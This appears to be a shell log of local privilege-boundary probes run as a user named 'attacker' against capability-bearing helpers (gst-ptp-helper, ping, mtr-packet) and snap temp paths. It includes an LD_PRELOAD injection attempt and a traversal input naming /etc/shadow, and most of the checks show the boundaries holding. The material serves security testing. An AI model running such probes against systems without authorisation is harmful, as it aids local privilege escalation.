++ runuser -u attacker -- LD_PRELOAD=/tmp/no-such-gst-preload.so /usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper -i eth0 --clock-id 0x0102030405060708 </dev/null >/tmp/gst-preload.out 2>/tmp/gst-preload.err; echo gst_preload_rc=$?; xxd -p /tmp/gst-preload.out 2>/dev/null || od -An -tx1 /tmp/gst-preload.out; tail -c 300 /tmp/gst-preload.err | tr "\000" "?"; rm -f /tmp/gst-preload.out /tmp/gst-preload.err
+gst_preload_rc=0
+0008020102030405060708
+rs?gst_ptp_helper???~Binding to interface eth0?]?../libs/gst/helpers/ptp/main.rs?gst_ptp_helper???›Using clock ID [1, 2, 3, 4, 5, 6, 7, 8]?œ?../libs/gst/helpers/ptp/main.rs?gst_ptp_helper??¤Exited with error: Failed reading packet header from stdin
+
+Caused by:
+
+  failed to fill whole buffer
+rc=0
+
+===== ping and mtr cap_net_raw boundaries =====
++ runuser -u attacker -- ping -V 2>&1; ping -c1 -W1 127.0.0.1 2>&1 | sed -n "1,20p"; echo ping_rc=${PIPESTATUS:-$?}
+ping from iputils 20240117
+libcap: yes, IDN: yes, NLS: no, error.h: yes, getrandom(): yes, __fpending(): yes
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms
+ping_rc=0
+rc=0
++ runuser -u attacker -- ping -m 123 -c1 -W1 127.0.0.1 2>&1 | sed -n "1,30p"; echo ping_mark_rc=${PIPESTATUS:-$?}
+ping: WARNING: failed to set mark: 123: Operation not permitted
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+ping: WARNING: failed to set mark: 123: Operation not permitted
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.014/0.014/0.014/0.000 ms
+ping_mark_rc=0
+rc=0
++ runuser -u attacker -- ping -i 1 -c 3 127.0.0.1 >/tmp/ping-long.out 2>/tmp/ping-long.err & pid=$!; sleep 0.2; echo ping_pid=$pid; grep -E "^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs):" /proc/$pid/status 2>&1 || true; getpcaps $pid 2>&1 || true; wait $pid; echo ping_wait_rc=$?; cat /tmp/ping-long.err; rm -f /tmp/ping-long.out /tmp/ping-long.err
+ping_pid=765918
+Uid:	1001	1001	1001	1001
+Gid:	1001	1001	1001	1001
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	000001ffffffffff
+CapAmb:	0000000000000000
+NoNewPrivs:	0
+765918: =
+ping_wait_rc=0
+rc=0
++ runuser -u attacker -- timeout 3 /usr/bin/mtr-packet 2>&1 <<EOF
+1 check-support feature send-probe
+2 check-support feature mark
+3 send-probe ip-4 127.0.0.1 protocol icmp size 64 bit-pattern 0 timeout 1
+4 send-probe ip-4 127.0.0.1 protocol icmp mark 123 size 64 bit-pattern 0 timeout 1
+5 ../../etc/shadow path /tmp/x
+EOF
+echo mtr_packet_rc=$?
+1 feature-support support ok
+2 feature-support support ok
+5 unknown-command
+3 reply ip-4 127.0.0.1 round-trip-time 34
+4 reply ip-4 127.0.0.1 round-trip-time 18
+mtr_packet_rc=0
+rc=0
++ runuser -u attacker -- mkfifo /tmp/mtr-hold.in; /usr/bin/mtr-packet </tmp/mtr-hold.in >/tmp/mtr-hold.out 2>/tmp/mtr-hold.err & pid=$!; exec 9>/tmp/mtr-hold.in; sleep 0.2; echo mtr_pid=$pid; grep -E "^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs):" /proc/$pid/status 2>&1 || true; getpcaps $pid 2>&1 || true; printf "9 bogus\n" >&9; sleep 0.2; exec 9>&-; wait $pid; echo mtr_wait_rc=$?; cat /tmp/mtr-hold.out /tmp/mtr-hold.err 2>/dev/null; rm -f /tmp/mtr-hold.in /tmp/mtr-hold.out /tmp/mtr-hold.err
+mtr_pid=765932
+Uid:	1001	1001	1001	1001
+Gid:	1001	1001	1001	1001
+CapInh:	0000000000000000
+CapPrm:	0000000000002000
+CapEff:	0000000000002000
+CapBnd:	000001ffffffffff
+CapAmb:	0000000000000000
+NoNewPrivs:	0
+765932: cap_net_raw=ep
+mtr_wait_rc=0
+9 unknown-command
+rc=0
+
+===== cleanup verification =====
++ test ! -e /tmp/capability-helpers-probe; echo workdir_removed_rc=$?; ls -l /run/snapd/lock 2>&1 || true; find /tmp -maxdepth 1 \( -name "snap.rootfs_ATTACK" -o -name "snap-private-tmp" \) -printf "%M %u:%g %p -> %l\n" 2>/dev/null || true
+workdir_removed_rc=0
+total 0
+drwx------ root:root /tmp/snap-private-tmp -> 
+rc=0
